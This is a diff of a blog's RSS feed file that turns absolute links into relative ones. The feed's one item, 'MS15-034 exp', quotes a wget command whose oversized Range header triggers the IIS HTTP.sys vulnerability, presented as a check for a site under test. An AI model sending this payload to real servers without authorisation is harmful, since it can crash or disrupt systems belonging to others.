@@ -2,7 +2,7 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>安全漏洞 on 程序猿的小本本</title>
-    <link>http://www.gsymy.com/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</link>
+    <link>/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</link>
     <description>Recent content in 安全漏洞 on 程序猿的小本本</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
@@ -11,15 +11,15 @@
     <copyright>(c) 2016 gsymy.com.</copyright>
     <lastBuildDate>Wed, 12 Aug 2015 11:00:02 +0000</lastBuildDate>
     
-	<atom:link href="http://www.gsymy.com/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>MS15-034 exp</title>
-      <link>http://www.gsymy.com/2015/08/12/ms15-034-exp.html</link>
+      <link>/2015/08/12/ms15-034-exp.html</link>
       <pubDate>Wed, 12 Aug 2015 11:00:02 +0000</pubDate>
       <author>chennqqi@qq.com (chennqqi)</author>
-      <guid>http://www.gsymy.com/2015/08/12/ms15-034-exp.html</guid>
+      <guid>/2015/08/12/ms15-034-exp.html</guid>
       <description>wget 一句话
 wget http://www.host.com --header=&#34;Range: bytes=0-18446744073709551615&#34; http://www.host.com 是你要测试的网站 &amp;nbsp;
 话说这个漏洞已经修复差不多了</description>
